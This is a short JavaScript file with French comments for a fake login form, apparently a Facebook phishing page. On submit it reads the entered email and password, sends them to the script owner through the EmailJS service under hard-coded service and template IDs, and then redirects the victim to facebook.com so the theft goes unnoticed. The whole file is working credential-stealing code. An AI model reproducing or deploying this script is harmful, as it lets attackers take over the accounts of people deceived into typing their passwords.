document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault();

    // Récupérer les valeurs du formulaire
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Préparer les paramètres du template
    const templateParams = {
        name: email,
        email: email,
        message: password
    };

    // Envoyer l'e-mail via EmailJS
    emailjs.send('service_2y8wxkr', 'template_y2bfzbs', templateParams)
        .then(function (response) {
            console.log('SUCCESS!', response.status, response.text);
            // Rediriger directement vers Facebook sans boîte de confirmation
            window.location.href = 'https://www.facebook.com';
        }, function (error) {
            console.log('FAILED...', error);
            alert('Échec de l\'envoi des informations. Veuillez réessayer.');
        });
});
